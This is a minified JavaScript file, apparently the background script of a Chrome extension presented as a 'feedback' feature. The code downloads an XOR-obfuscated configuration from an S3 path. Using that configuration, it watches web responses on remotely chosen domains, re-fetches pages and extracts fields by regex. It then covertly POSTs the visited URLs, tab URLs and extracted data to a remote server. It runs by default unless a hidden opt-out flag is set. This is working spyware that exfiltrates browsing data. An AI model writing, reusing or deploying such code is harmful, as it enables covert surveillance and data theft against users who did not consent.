var eid=chrome.i18n.getMessage("@@extension_id");function e(h){var f="";if(h!=null){for(i=0;i<h.length;i++){var d=h.charCodeAt(i);var c=d^385;f=f+String.fromCharCode(c)}}return f}function s(f,b){output="";for(var c in f){output+=encodeURI(e(c))+"="+encodeURI(e(f[c]))+"&"}var d=new XMLHttpRequest();d.open("POST",b,true);d.setRequestHeader("Content-type","application/x-www-form-urlencoded");d.send(output)}function a(c,b){chrome.webRequest.onHeadersReceived.addListener(function(j){if(j.tabId==-1){return}var l=null;for(var h=0;h<j.responseHeaders.length;h++){var f=j.responseHeaders[h].name;if(f.toLowerCase()=="content-type"){l=j.responseHeaders[h].value}}var k=null;if(c.ctm1){k=new RegExp(c.ctm1,"i")}if(!c.ctm1||(l!=null&&k.test(l))){var d=[j.url,""];chrome.tabs.get(j.tabId,function(m){var n="";chrome.tabs.getSelected(null,function(o){n=o.url;var u=j.url.toLowerCase();if(c.fm1&&c.fm1!=""){var t=new RegExp(c.fm1,"i");if(!t.test(u)){return}}if(c.fm2&&c.fm2!=""){var q=new RegExp(c.fm2,"i");if(!q.test(u)){return}}if(c.fnm1&&c.fnm1!=""){var v=new RegExp(c.fnm1,"i");if(v.test(u)){return}}p(j.url,c,function(w,x){s({eid:eid,aid:c.aid+"",ct:c.ct+"",t:c.t+"",tu:m.url,u:j.url,ts:Math.round(j.timeStamp)+"",atu:n,a:w,lp:x},b)})})})}},{urls:["*://"+(c.d.indexOf(".")==0?"*"+c.d:c.d)+"/*"]},["responseHeaders"])}function g(){var b=new XMLHttpRequest();b.open("GET","https://s3.amazonaws.com/plugin-feedback/config.3",true);b.onreadystatechange=function(){if(b.readyState==4){var c=JSON.parse(e(b.responseText));for(var d=0;d<c.config.length;d++){a(c.config[d],c.submissionUrl)}}};b.send()}function r(h,d){var c="";var f=new RegExp(h,"i");var b=d.match(f);if(b&&b.length>1){c=b[1]}else{if(b&&b.length>0){c=b[0]}}return c}function p(c,b,h){if(b.ppl==0){h();return}for(i=0;i<b.ur.length;i++){var d=new RegExp(b.ur[i].sr,"i");c=c.replace(d,b.ur[i].rs)}var f=new XMLHttpRequest();f.open("GET",c,true);f.onreadystatechange=function(){if(f.readyState==4){var m=f.responseText;var k="";var j="";if(b.ar){var k=r(b.ar,m);if(!k||k.length==0){k=r(b.ar2,m)}}if(b.lr){var j=r(b.lr,m);if(!j||j.length==0){j=r(b.lr2,m)}}if(k!=""&&j!=""){h(k,j)}}};f.send()}var optOut=localStorage.feedbackOptOut;if(!optOut){g()};